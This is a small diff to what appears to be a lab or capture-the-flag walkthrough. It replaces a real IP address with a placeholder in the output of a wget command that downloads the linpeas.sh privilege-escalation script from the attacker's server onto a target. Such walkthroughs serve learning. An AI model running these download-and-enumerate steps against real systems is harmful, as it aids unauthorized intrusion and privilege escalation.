@@ -322,7 +322,7 @@ curl command
 ```shell
 $ wget <IP>:8000/linpeas.sh
 wget <IP>:8000/linpeas.sh
---2023-08-02 15:50:03--  http://10.8.122.251:8000/linpeas.sh
+--2023-08-02 15:50:03--  http://<IP>:8000/linpeas.sh
 Connecting to <IP>:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 134168 (131K) [text/x-sh]
